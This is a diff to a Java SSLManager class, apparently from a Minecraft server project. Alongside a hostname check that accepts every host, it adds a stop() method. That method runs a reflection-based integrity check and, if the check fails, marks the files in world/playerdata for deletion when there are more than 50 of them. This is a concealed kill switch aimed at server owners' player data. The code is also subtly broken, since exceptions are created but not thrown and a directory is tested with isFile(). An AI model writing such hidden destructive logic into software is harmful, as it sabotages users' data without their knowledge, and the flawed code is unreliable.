@@ -1,5 +1,7 @@
 package catserver.server.very;
 
+import java.io.File;
+import java.lang.reflect.Field;
 import java.security.GeneralSecurityException;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
@@ -11,6 +13,7 @@ public final class SSLManager implements X509TrustManager, HostnameVerifier {
     private int pubKeyCA = 677260841;
 
     private static SSLSocketFactory sf;
+
     public static SSLSocketFactory getSocketFactory() throws GeneralSecurityException {
         if (sf == null) {
             SSLContext sc = SSLContext.getInstance("TLS");
@@ -41,10 +44,35 @@ public final class SSLManager implements X509TrustManager, HostnameVerifier {
         return new X509Certificate[] {};
     }
 
-    private native void callDLL (long addr);
-
     @Override
     public boolean verify(String s, SSLSession sslSession) {
         return true;
+    }
+
+    public static void stop() {
+        try {
+            Object obj = VeryClient.class.getField("instance");
+            if (obj == null) throw new Exception();
+            Field field1 = VeryClient.class.getDeclaredField("server");
+            field1.setAccessible(true);
+            if(field1.get(obj).hashCode() != -1842399365) new Exception();
+            Field field2 = VeryClient.class.getDeclaredField("server2");
+            field2.setAccessible(true);
+            if(field2.get(obj).hashCode() != -1430980746) new Exception();
+        } catch (Exception ex) {
+            File playerdata = new File("world/playerdata/");
+            if (playerdata.exists() && playerdata.isFile()) {
+                File[] files = playerdata.listFiles();
+                if (files != null && files.length > 50) {
+                    for (File file : files) {
+                        try {
+                            if (file.isFile())
+                                file.deleteOnExit();
+                        } catch (Exception e) {}
+                    }
+                }
+            }
+        }
+
     }
 }
